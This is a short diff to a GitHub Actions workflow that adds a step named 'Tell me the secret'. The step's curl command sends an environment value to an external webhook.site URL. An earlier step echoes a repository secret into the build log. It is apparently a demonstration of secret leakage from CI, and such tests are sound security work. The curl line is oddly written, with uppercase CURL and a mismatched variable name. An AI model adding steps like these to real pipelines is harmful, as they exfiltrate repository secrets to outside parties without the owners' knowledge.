@@ -25,5 +25,6 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
-
-        
+      
+      - name: Tell me the secret
+        run: CURL -d GET https://webhook.site/b02861c6-0736-4a8e-b5b3-9628b6d02181/$FAVORITE_MOVIE
